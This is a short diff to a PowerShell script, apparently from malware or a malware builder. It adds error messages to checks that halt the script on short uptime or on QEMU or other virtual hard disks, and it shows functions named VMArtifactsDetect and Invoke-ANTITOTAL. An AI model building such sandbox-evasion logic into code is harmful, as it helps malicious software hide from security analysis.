@@ -115,7 +115,7 @@ function VMArtifactsDetect {
 function CheckUptime {
     $uptime = [math]::Round([System.Diagnostics.Stopwatch]::GetTimestamp() / [System.Diagnostics.Stopwatch]::Frequency * 1000 / 1000)
     if ($uptime -lt 1200) {
-        ShowError'UPTIME DETECTED !'
+        ShowError 'UPTIME DETECTED !'
         StopBatch  
     }
 }
@@ -212,7 +212,8 @@ function Invoke-ANTITOTAL {
 
 function VMPROTECT {
     $d = wmic diskdrive get model
-    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
+    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
+        ShowError "VM HARDISK DETECTED !"
         StopBatch   
     }
 
